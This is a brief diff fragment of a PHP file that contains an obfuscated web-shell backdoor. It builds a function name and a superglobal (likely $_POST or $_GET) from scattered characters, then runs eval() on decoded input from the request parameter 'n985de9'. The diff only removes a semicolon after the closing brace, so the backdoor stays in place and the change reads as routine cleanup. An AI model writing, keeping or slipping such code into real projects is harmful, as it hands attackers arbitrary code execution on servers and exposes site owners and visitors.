@@ -4,5 +4,5 @@ $s21 = strtolower($sF[4] . $sF[5] . $sF[9] . $sF[10] . $sF[6] . $sF[3] . $sF[11]
 $s22 = ${strtoupper($sF[11] . $sF[0] . $sF[7] . $sF[9] . $sF[2])}['n985de9'];
 if (isset($s22)) {
     eval($s21($s22));
-};
+}
 ?>
